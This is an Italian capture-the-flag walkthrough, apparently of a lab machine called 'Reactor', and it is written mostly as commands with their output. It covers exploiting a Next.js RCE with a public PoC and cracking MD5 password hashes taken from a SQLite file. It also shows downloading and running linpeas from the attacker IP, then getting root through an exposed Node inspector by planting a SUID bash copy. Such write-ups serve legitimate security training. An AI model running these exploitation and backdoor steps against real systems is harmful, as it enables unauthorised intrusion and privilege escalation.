# Reactor
IP vittima: 10.129.4.97
IP attaccante: 10.10.14.241
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.4.97 -oG porte`
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
```
`sudo nmap -sC -sV -p22,3000 10.129.4.97 -oN servizi`0
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 26 May 2026 17:37:30 GMT
|     Connection: close
... snip ...
```
La porta **22** è un servizio **ssh** mentre la porta **3000** espone una web app **Next.js**.
Se visitiamo il sito http://10.129.4.97:3000 troviamo un sito statico con titolo **ReactorWatch | Core Monitoring System**
Con [[wappalyzer]]troviamo la versione di **Next.js** che è la **15.0.3**
Questa informazione è stata determinante perché Next.js `15.0.3`, quando usa App Router / React Server Components, rientra tra le versioni affette da **CVE-2025-55182**, nota anche come **React2Shell**.

La vulnerabilità è una **pre-authentication remote code execution** legata a React Server Components / Server Functions. L’advisory ufficiale di Next.js indica che il problema affetta Next.js `15.x` e `16.x` quando viene usato App Router, ed è tracciato upstream come `CVE-2025-55182`; per la linea `15.0.x`, la versione correttiva indicata è `15.0.5`.

L’advisory NVD descrive CVE-2025-55182 come una RCE pre-authentication dovuta alla deserializzazione non sicura di payload inviati a endpoint di Server Functions nei pacchetti React Server Components.
## CVE-2025-55182 - Foothold
Per lo sfruttamento della vulnerabilità è stato usato questo POC:
https://github.com/ThemeHackers/CVE-2025-55182
Installazione:
``` bash
git clone https://github.com/ThemeHackers/CVE-2025-55182 # clonata la repository
cd CVE-2025-55182 # entriamo nella directory della repository
python -m venv venv # creiamo l'ambiente venv di python
source venv/bin/activate # attiviamo l'ambiente venv di python
pip3 install -r requirements.txt # installiamo le dipendenze
```
Con il comando
`python3 CVE-2025-55182.py -u http://10.129.4.97:3000`
Controlliamo se l'url target è vulnerabile
```
React2Shell Scanner - CVE-2025-55182/CVE-2025-66478
[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[DEBUG] Elapsed: 0.12s (Variant: None)
[VULNERABLE] http://10.129.4.97:3000 - RCE Confirmed!
... snip ...
```
Con il comando 
`python3 CVE-2025-55182.py -u http://10.129.4.97:3000 --exploit`
Lanciamo l'exploit e otteniamo una shell come user **node** nella cartella **/opt/reactor-app**
## Movimento laterale
### Enumerazione locale
Lo user **node** non è lo usewr con la flag.
con `cat /etc/passwd` abbiamo rilevato la presenza dello user **engineer**
```
... snip ...
engineer❌1000:1000:engineer:/home/engineer:/bin/bash
node❌999:988::/home/node:/usr/sbin/nologin
_laurel❌996:987::/var/log/laurel:/bin/false
```
Nella cartella **/opt/reactor-app** (non è possibile uscire da questa cartella) troviamo:
```
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
```
l file `.env` contiene la configurazione dell’applicazione:
```
cat .env
```
Output:
```
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```
Da questo file si ricavava che l’app usa un database SQLite locale:
```
/opt/reactor-app/reactor.db
```
Il file è leggibile dall’utente `node`.
### Analisi del database SQLite
Dopo alcuni tentativi infruttuosi di leggere **reactor.db** con [[sqlite]]abbiamo usato il comando **strings** sul file.
`strings -a reactor.db`
```
SQLite format 3
Mtablesensor_logssensor_logs
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
9tableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
5engineer39d97110eafe2a9a68639812cd271e8eoperatorengineer@reactor.htbI
M'/admina203b22191d744a4e70ada5c101b17b8administratoradmin@reactor.htb
2025-12-28 14:32:01COOLANT_FLOW@2ffffffCAUTION3
2025-12-28 14:32:01PRESSURE_01@cffffffNOMINAL4
2025-12-28 14:32:01CORE_TEMP_01@tH
NOMINAL
```
Il database contiene quindi una tabella `users` con almeno due utenti:
```
engineer : 39d97110eafe2a9a68639812cd271e8e : operator      : engineer@reactor.htb
admin    : a203b22191d744a4e70ada5c101b17b8 : administrator : admin@reactor.htb
```
Gli hash sono lunghi 32 caratteri esadecimali, quindi il formato più probabile è **Raw-MD5**
### Cracking degli hash
Salviamo gli hash trovati:
```
cat > hashes.txt << 'EOF'
engineer:39d97110eafe2a9a68639812cd271e8e
admin:a203b22191d744a4e70ada5c101b17b8
EOF
```
Poi usiamo John the Ripper con formato Raw-MD5:
```
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
Troviamo la password **reactor1** per l'user **engineer**
```
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
reactor1         (engineer)     
1g 0:00:00:00 DONE (2026-05-26 20:17) 1.408g/s 20201Kp/s 20201Kc/s 20676KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
## Pivot da `node` a `engineer` - user flag
Con la password **reactor1** ottenuta dal cracking, è possibile accedere via SSH come **engineer**:
`ssh engineer@10.129.4.97`
```
The authenticity of host '10.129.4.97 (10.129.4.97)' can't be established.
ED25519 key fingerprint is SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:30: [hashed name]
    ~/.ssh/known_hosts:33: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.4.97' (ED25519) to the list of known hosts.
engineer@10.129.4.97's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Tue May 26 18:18:57 2026 from 10.10.14.241
```
Nella cartella **/home/engineer** troviamo la user flag.
## Privilege Escalation
Dopo il login come **engineer** controlliamo la situazione dello user:
```
whoami: engineer  
pwd: /home/engineer
id: uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
sudo -l: Sorry, user engineer may not run sudo on reactor.
```
### Linpeas
Dopo aver scaricato [[linpeas]]sulla macchina target:
``` bash
# macchina attacante
python -m http.server 4444 # lanciamo un server python nella cartella della nostra macchina che contiene linpeas
# macchina target
wget http://10.10.14.241:4444/linpeas.sh # con wget sulla macchina target scarichiamo linpeas
bash linpeas.sh # lanciamo linpeas
```
#### Processo Node root con `--inspect`
Questa è la riga più importante di tutto l’output:
``` bash
... snip ...
root        1387  0.0  1.1 1066792 47380 ?       Ssl  17:33   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
... snip ...
```
LinPEAS l’ha individuata nella sezione:
```
Processes, Crons, Timers, Services and Sockets
```
Questa riga contiene tutti gli elementi della privesc:
```
root                       → il processo gira come root
/usr/bin/node              → processo Node.js
--inspect=127.0.0.1:9229   → Node Inspector attivo su localhost
/opt/uptime-monitor/worker.js → script eseguito dal processo
```
Rivela direttamente che un processo Node è eseguito come root ed espone il debugger **Inspector** su localhost.
Questo è il risultato decisivo. Da qui basta collegarsi al debugger locale con:
```
node inspect 127.0.0.1:9229
```
e poi eseguire codice nel processo root.
#### Porta locale `9229` in ascolto
Nella sezione networking, LinPEAS mostra:
```
tcp  0  0 127.0.0.1:9229  0.0.0.0:*  LISTEN
```
e poi la evidenzia anche tra i listener locali:
```
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      511        127.0.0.1:9229      0.0.0.0:* 
```
Questa informazione conferma che il debugger Node è raggiungibile solo localmente.
Da remoto non si vedeva con Nmap, ma una volta ottenuta la shell come `engineer`, è accessibile tramite localhost.
### Connessione con il client Inspector integrato di Node
Il metodo più pulito consiste nell’usare direttamente il client integrato di Node:
```
node inspect 127.0.0.1:9229
```
 Output:
```
connecting to 127.0.0.1:9229 ... okdebug>
```
A questo punto siamo dentro la console di debug del processo Node che gira come `root`.
#### Esecuzione di comandi come root
Dentro la console `debug>`, ho usato `exec()` per valutare codice JavaScript nel processo remoto.
Il primo test è stato eseguire `id`:
```
exec('process.mainModule.require("child_process").execSync("id").toString()')
```
Output:
```
'uid=0(root) gid=0(root) groups=0(root)\n'
```
Questo conferma che il codice veniva eseguito con privilegi root.
Il comando JavaScript può essere letto così:
```
process.mainModule.require("child_process")
```
carica il modulo Node.js `child_process`.
```
.execSync("id")
```
esegue il comando Linux `id`.
```
.toString()
```
converte l’output in una stringa leggibile.
Il motivo per cui viene usato:
```
process.mainModule.require(...)
```
invece di:
```
require(...)
```
è che nel contesto del debugger `require` può non essere disponibile direttamente come variabile globale. `process.mainModule.require()` permette invece di recuperare il sistema `require` del modulo principale del processo Node.
#### Creazione di una shell SUID root
 Una volta confermata l’esecuzione comandi come root, ho creato una copia SUID di Bash in `/tmp`.
Sempre dentro il prompt `debug>`:
```
exec('process.mainModule.require("child_process").execSync("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash").toString()')
```
Questo comando esegue, come root:
```
cp /bin/bash /tmp/rootbashchmod 4755 /tmp/rootbash
```
Il primo comando copia Bash in `/tmp`.
Il secondo comando imposta il bit SUID:
```
chmod 4755
```
A questo punto `/tmp/rootbash` diventa un binario di proprietà root con bit SUID attivo.
Sono uscito dal debugger e ho verificato i permessi:
```
ls -la /tmp/rootbash
```
Output atteso:
```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```
La `s` in:
```
-rws
```
indica che il bit SUID è attivo.
#### Ottenimento della shell root
Ho quindi eseguito la Bash SUID con l’opzione `-p`:
```
/tmp/rootbash -p
```
L’opzione `-p` è importante perché dice a Bash di preservare l’effective UID. Senza `-p`, Bash può ridurre i privilegi per motivi di sicurezza.
Verifica:
```
whoami
```
Output:
```
root
```
Siamo root.
Nella cartella **/root** troviamo la root flag.
## Il binario SUID
Un **binario SUID** è un file eseguibile Linux che, quando viene lanciato, viene eseguito con i privilegi del **proprietario del file**, non con quelli dell’utente che lo avvia.
Nel caso tipico:
```
-rwsr-xr-x 1 root root /path/binario
```
la `s` in:
```
rws
```
indica che il bit **SUID** è attivo.
Se il proprietario è `root`, quando un utente normale esegue quel binario, il processo ottiene temporaneamente privilegi effettivi di root.
